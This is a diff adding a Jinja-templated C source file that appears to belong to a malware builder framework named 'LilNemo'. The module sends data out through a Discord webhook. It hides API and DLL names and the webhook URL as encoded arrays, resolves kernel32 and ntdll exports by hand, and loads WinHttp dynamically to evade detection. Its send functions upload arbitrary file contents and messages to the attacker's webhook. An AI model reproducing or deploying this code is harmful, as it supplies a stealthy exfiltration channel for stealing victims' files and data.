@@ -1,0 +1,453 @@
+#!name##LilNemo_CandyHook_C
+#!itemType##sfile
+#!info##LittleNemo Candy Discord Hook C file.
+#!lang##c
+#!addNameComp##True
+#!Var##LNDH_url##/api/webhooks/YourWebHook##Discord WebHook URL. Ex: /api/webhooks/123456.... ##str
+#!preRT##_DCHOOK_SHADOW##LilNemoShadow##LHK_key##LHK_power
+
+{% set _K32DLL = ["KERNEL32.dll", "Kernel32.dll", "KERNEL32.DLL", "kernel32.dll"] %}
+{% set _NTDLL = ["ntdll.dll"] %}
+
+#include "lil_nemo_candy_dchook.h"
+
+#include <stdio.h>
+
+uint16_t* lil_nemo_food_dc_inMemModList(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.genInMemModList()}}
+    };
+    memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+}
+
+uint16_t* lil_nemo_food_dc_rvaExpTab(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.genRvaExpTab()}}
+    };
+    memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+}
+
+pLIL_NEMO_FOOD_LIST lil_nemo_food_dc_kernel32(uint16_t **buff, uint16_t buff_size) {
+{{ _DCHOOK_SHADOW.shadowList(_K32DLL) }}
+
+    pLIL_NEMO_FOOD_LIST flist = lil_nemo_food_make();
+    flist->size = malloc(sizeof(all_size));
+    memset(flist->size, 0, sizeof(all_size));
+    memcpy(flist->size, all_size, sizeof(all_size));
+    memset(buff, 0, buff_size * sizeof(uint16_t*));
+    memcpy(buff, all_addr, sizeof(all_addr));
+    flist->list_ptr = buff;
+    return flist;
+}
+
+
+
+pLIL_NEMO_FOOD_LIST lil_nemo_food_dc_ntdll(uint16_t **buff, uint16_t buff_size) {
+{{ _DCHOOK_SHADOW.shadowList(_NTDLL) }}
+
+    pLIL_NEMO_FOOD_LIST flist = lil_nemo_food_make();
+    flist->size = malloc(sizeof(all_size));
+    memset(flist->size, 0, sizeof(all_size));
+    memcpy(flist->size, all_size, sizeof(all_size));
+    memset(buff, 0, buff_size * sizeof(uint16_t*));
+    memcpy(buff, all_addr, sizeof(all_addr));
+    flist->list_ptr = buff;
+    return flist;
+}
+
+// LoadLibraryA
+uint16_t* lil_nemo_food_dc_loadlibrarya(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.shadowStr("LoadLibraryA")}}
+    };
+	memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+}
+
+// LdrLoadDll
+uint16_t* lil_nemo_food_dc_LdrLoadDll(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.shadowStr("LdrLoadDll")}}
+    };
+    memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+
+}
+
+// MultiByteToWideChar
+uint16_t* lil_nemo_food_dc_MultiByteToWideChar(uint16_t *buff, uint16_t buff_size) {
+	uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.shadowStr("MultiByteToWideChar")}}
+    };
+	memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+}
+
+
+// WinHttpOpen
+uint16_t* lil_nemo_food_WinHttpOpen(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.shadowStr("WinHttpOpen")}}
+    };
+    memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+
+}
+
+// WinHttpConnect
+uint16_t* lil_nemo_food_WinHttpConnect(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.shadowStr("WinHttpConnect")}}
+    };
+    memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+
+}
+
+// WinHttpOpenRequest
+uint16_t* lil_nemo_food_WinHttpOpenRequest(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.shadowStr("WinHttpOpenRequest")}}
+    };
+    memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+
+}
+
+// WinHttpAddRequestHeaders
+uint16_t* lil_nemo_food_WinHttpAddRequestHeaders(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.shadowStr("WinHttpAddRequestHeaders")}}
+    };
+    memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+
+}
+
+// WinHttpSendRequest
+uint16_t* lil_nemo_food_WinHttpSendRequest(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.shadowStr("WinHttpSendRequest")}}
+    };
+    memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+
+}
+
+// WinHttpCloseHandle
+uint16_t* lil_nemo_food_WinHttpCloseHandle(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.shadowStr("WinHttpCloseHandle")}}
+    };
+    memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+
+}
+
+
+
+// --------------------------------------- This Functions uses STR_KEY ------------------------------------------------------
+
+
+// Winhttp.dll
+pLIL_NEMO_FOOD_TEXT lil_nemo_food_winhttp_dll(void) {
+     uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.encodeString("Winhttp.dll")}}
+    };
+    pLIL_NEMO_FOOD_TEXT ftext = lil_nemo_food_text_make();
+    ftext->size = sizeof(raddr);
+    ftext->text = malloc(ftext->size);
+    memset(ftext->text, 0, ftext->size);
+    memcpy(ftext->text, raddr, ftext->size);
+    return ftext;
+}
+
+// web hook url
+pLIL_NEMO_FOOD_TEXT lil_nemo_food_webhook_url(void) {
+    uint16_t raddr[] = {
+        {{_DCHOOK_SHADOW.encodeString(LNDH_url)}}
+    };
+    pLIL_NEMO_FOOD_TEXT ftext = lil_nemo_food_text_make();
+    ftext->size = sizeof(raddr);
+    ftext->text = malloc(ftext->size);
+    memset(ftext->text, 0, ftext->size);
+    memcpy(ftext->text, raddr, ftext->size);
+    return ftext;
+}
+
+// ---------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+static void nhfClearUrl(pLIL_NEMO_DCH_URL nurl) {
+    for (int i=0; i<nurl->size / 2; i++) {
+        nurl->url[i] = 0;
+    }
+    free(nurl->url);
+    free(nurl);
+}
+
+
+pLIL_NEMO_DCH_URL nhGetDcUrl(pLIL_NEMO_DC_HOOK nhook) {
+    nhook->bag->decode_wchar(lil_nemo_food_webhook_url, nhook->bag);
+    pLIL_NEMO_DCH_URL nurl = malloc(sizeof(LIL_NEMO_DCH_URL));
+    memset(nurl, 0, sizeof(LIL_NEMO_DCH_URL));
+    int url_size = wcslen(nhook->bag->wstr_buff) * sizeof(wchar_t);
+    nurl->url = malloc(url_size + 2);
+    nurl->size = url_size;
+    memset(nurl->url, 0, url_size + 2);
+    memcpy(nurl->url, nhook->bag->wstr_buff, url_size);
+    //int wb_id = 0;
+    memset(nhook->bag->wstr_buff, 0, nhook->bag->wstr_buff_size);
+    nurl->clear = nhfClearUrl;
+    return nurl;
+}
+
+BOOL nhSendMessage(char *title_msg, char *text_msg, pLIL_NEMO_DC_HOOK nhook) {
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    BOOL bResults = 0;
+    hSession = nhook->httpOpen(NEMO_HOOK_HTTP_HOST_NAME, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+     if (hSession) {
+        hConnect = nhook->httpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
+    }
+    else {
+        return 0;
+    }
+    pLIL_NEMO_DCH_URL nurl = nhook->get_url(nhook);
+    if (hConnect) {
+        hRequest = nhook->httpOpenRequest(hConnect, L"POST", nurl->url, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    }
+    else {
+        nurl->clear(nurl);
+        return 0;
+    }
+    nurl->clear(nurl);
+    char username[] = NEMO_HOOK_USERNAME;
+    LPCWSTR httpHeader = L"Content-Type: application/json\r\n";
+    nhook->httpAddReqHeader(hRequest, httpHeader, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
+    char jsonBody[NEMO_HOOK_JSON_BODY_SIZE];
+    snprintf(jsonBody, NEMO_HOOK_JSON_BODY_SIZE,
+        "{"
+            "\"content\": \"New Message\","
+            "\"username\": \"%s\","
+            "\"embeds\": [{"
+                "\"title\": \"%s\","
+                "\"description\": \"%s\""
+            "}]"
+        "}",
+        username, title_msg, text_msg
+    );
+    DWORD bodyLen = (DWORD)strlen(jsonBody);
+    bResults = nhook->httpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)jsonBody, bodyLen, bodyLen, 0);
+    if (hRequest) nhook->httpCloseHandle(hRequest);
+    if (hConnect) nhook->httpCloseHandle(hConnect);
+    if (hSession) nhook->httpCloseHandle(hSession);
+
+    return bResults;
+}
+
+char* nhfGenerateSeparator(char *separator) {
+    strcpy(separator, NEMO_HOOK_SEPARATOR);
+    int sep_len = strlen(NEMO_HOOK_SEPARATOR);
+    int sep_id = 0;
+    int sep_no;
+    while (sep_id < NEMO_HOOK_SEPARATOR_SIZE) {
+        sep_no = rand();
+        snprintf(separator + sep_len + sep_id, sizeof(int), "%d", sep_no);
+        sep_id++;
+    }
+    return separator;
+}
+
+BOOL nhSendFile(BYTE *file_data, DWORD file_size, char *file_name, pLIL_NEMO_DC_HOOK nhook) {
+    char separator[50 + NEMO_HOOK_SEPARATOR_SIZE];
+    nhfGenerateSeparator(separator);
+    const char* field_name = "file";
+    // BUILD FILE SEND DATA
+    // pre file data
+    char header_part[512];
+    int header_len = snprintf(header_part, sizeof(header_part),
+        "--%s\r\n"
+        "Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
+        "Content-Type: application/octet-stream\r\n"
+        "\r\n",
+        separator, field_name, file_name
+    );
+    // Make footer after file data.
+    char footer_part[128];
+    int footer_len = snprintf(footer_part, sizeof(footer_part),
+        "\r\n--%s--\r\n", separator
+    );
+    DWORD total_size = header_len + file_size + footer_len;
+    BYTE* body = malloc(total_size);
+
+    BYTE* p = body;
+    memcpy(p, header_part, header_len);
+    p += header_len;
+    memcpy(p, file_data, file_size);
+    p += file_size;
+    memcpy(p, footer_part, footer_len);
+    p += footer_len;
+
+    // Header Content-Type from boundary ---
+    wchar_t contentTypeHeader[256];
+    swprintf(contentTypeHeader, 256,
+        L"Content-Type: multipart/form-data; boundary=%hs\r\n",
+        separator
+    );
+
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    BOOL bResults = FALSE;
+    hSession = nhook->httpOpen(NEMO_HOOK_HTTP_HOST_NAME, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (hSession) {
+        hConnect = nhook->httpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
+    }
+    else {
+        free(body);
+        return 0;
+    }
+    pLIL_NEMO_DCH_URL nurl = nhGetDcUrl(nhook);
+    if (hConnect) {
+        hRequest = nhook->httpOpenRequest(hConnect, L"POST", nurl->url, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    }
+    else {
+        free(body);
+        nurl->clear(nurl);
+        return 0;
+    }
+    nurl->clear(nurl);
+    if (hRequest) {
+        nhook->httpAddReqHeader(hRequest, contentTypeHeader, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
+    }
+    else {
+        free(body);
+        return 0;
+    }
+     if (hRequest)
+        bResults = nhook->httpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)body, total_size, total_size, 0
+    );
+    free(body);
+    if (hRequest) nhook->httpCloseHandle(hRequest);
+    if (hConnect) nhook->httpCloseHandle(hConnect);
+    if (hSession) nhook->httpCloseHandle(hSession);
+    return 1;
+}
+
+
+static void nhfClearNemoHook(pLIL_NEMO_DC_HOOK nhook) {
+    nhook->bag->clear(nhook->bag);
+    free(nhook);
+}
+
+pLIL_NEMO_DC_HOOK nhMakeNemoHook(uint16_t *ekey, uint16_t *str_key) {
+    pLIL_NEMO_BAG bag = lil_nemo_bag_make(ekey, lil_nemo_food_dc_inMemModList, lil_nemo_food_dc_rvaExpTab, 0, NEMO_HOOK_BAG_BALLOC_SIZE, 0, NEMO_HOOK_BAG_STR_BUFF_SIZE);
+    bag->update_str_data(0, NEMO_HOOK_BAG_STR_BUFF_SIZE, bag);
+    bag->update_wstr_data(0, NEMO_HOOK_BAG_WSTR_BUFF_SIZE, bag);
+    bag->get_raw_dll(lil_nemo_food_dc_kernel32, bag->raw_k32, bag);
+    bag->get_raw_dll(lil_nemo_food_dc_ntdll, bag->raw_ntdll, bag);
+    bag->update_raw(bag->raw_multi_byte, lil_nemo_food_dc_MultiByteToWideChar, bag);
+    bag->update_raw(bag->raw_load_lib, lil_nemo_food_dc_loadlibrarya, bag);
+    bag->update_raw(bag->raw_load_ldr_lib, lil_nemo_food_dc_LdrLoadDll, bag);
+    bag->set_str_key(str_key, bag);
+    pLIL_NEMO_DC_HOOK nhook = malloc(sizeof(LIL_NEMO_DC_HOOK));
+    memset(nhook, 0, sizeof(LIL_NEMO_DC_HOOK));
+    nhook->bag = bag;
+    nhook->clear = nhfClearNemoHook;
+    nhook->winhttp_dll = bag->load_ldr_dll(lil_nemo_food_winhttp_dll, bag);
+    if (nhook->winhttp_dll == 0) {
+        goto L_RETURN_NULL;
+    }
+    nhook->httpOpen = bag->get_func2(lil_nemo_food_WinHttpOpen, nhook->winhttp_dll, bag);
+    if (nhook->httpOpen == 0) {
+        goto L_RETURN_NULL;
+    }
+    nhook->httpConnect = bag->get_func2(lil_nemo_food_WinHttpConnect, nhook->winhttp_dll, bag);
+    if (nhook->httpConnect == 0) {
+        goto L_RETURN_NULL;
+    }
+    nhook->httpAddReqHeader = bag->get_func2(lil_nemo_food_WinHttpAddRequestHeaders, nhook->winhttp_dll, bag);
+    if (nhook->httpAddReqHeader == 0) {
+        goto L_RETURN_NULL;
+    }
+    nhook->httpCloseHandle = bag->get_func2(lil_nemo_food_WinHttpCloseHandle, nhook->winhttp_dll, bag);
+    if (nhook->httpCloseHandle == 0) {
+        goto L_RETURN_NULL;
+    }
+    nhook->httpOpenRequest = bag->get_func2(lil_nemo_food_WinHttpOpenRequest, nhook->winhttp_dll, bag);
+    if (nhook->httpOpenRequest == 0) {
+        goto L_RETURN_NULL;
+    }
+    nhook->httpSendRequest = bag->get_func2(lil_nemo_food_WinHttpSendRequest, nhook->winhttp_dll, bag);
+    if (nhook->httpSendRequest == 0) {
+        goto L_RETURN_NULL;
+    }
+
+    nhook->get_url = nhGetDcUrl;
+    nhook->send_msg = nhSendMessage;
+    nhook->send_file = nhSendFile;
+    return nhook;
+
+    L_RETURN_NULL:
+        nhook->clear(nhook);
+        return 0;
+}
+
+pLIL_NEMO_DC_HOOK nhMakeNemoHook2(pLIL_NEMO_BAG bag) {
+    if (bag->raw_k32[0] == 0 || bag->raw_ntdll[0] == 0) {
+        return 0;
+    }
+    pLIL_NEMO_DC_HOOK nhook = malloc(sizeof(LIL_NEMO_DC_HOOK));
+    memset(nhook, 0, sizeof(LIL_NEMO_DC_HOOK));
+    nhook->bag = bag;
+    nhook->clear = nhfClearNemoHook;
+    nhook->winhttp_dll = bag->load_ldr_dll(lil_nemo_food_winhttp_dll, bag);
+    if (nhook->winhttp_dll == 0) {
+        goto L_RETURN_NULL;
+    }
+    nhook->httpOpen = bag->get_func2(lil_nemo_food_WinHttpOpen, nhook->winhttp_dll, bag);
+    if (nhook->httpOpen == 0) {
+        goto L_RETURN_NULL;
+    }
+    nhook->httpConnect = bag->get_func2(lil_nemo_food_WinHttpConnect, nhook->winhttp_dll, bag);
+    if (nhook->httpConnect == 0) {
+        goto L_RETURN_NULL;
+    }
+    nhook->httpAddReqHeader = bag->get_func2(lil_nemo_food_WinHttpAddRequestHeaders, nhook->winhttp_dll, bag);
+    if (nhook->httpAddReqHeader == 0) {
+        goto L_RETURN_NULL;
+    }
+    nhook->httpCloseHandle = bag->get_func2(lil_nemo_food_WinHttpCloseHandle, nhook->winhttp_dll, bag);
+    if (nhook->httpCloseHandle == 0) {
+        goto L_RETURN_NULL;
+    }
+    nhook->httpOpenRequest = bag->get_func2(lil_nemo_food_WinHttpOpenRequest, nhook->winhttp_dll, bag);
+    if (nhook->httpOpenRequest == 0) {
+        goto L_RETURN_NULL;
+    }
+    nhook->httpSendRequest = bag->get_func2(lil_nemo_food_WinHttpSendRequest, nhook->winhttp_dll, bag);
+    if (nhook->httpSendRequest == 0) {
+        goto L_RETURN_NULL;
+    }
+
+    nhook->get_url = nhGetDcUrl;
+    nhook->send_msg = nhSendMessage;
+    nhook->send_file = nhSendFile;
+    return nhook;
+
+    L_RETURN_NULL:
+        nhook->clear(nhook);
+        return 0;
+}
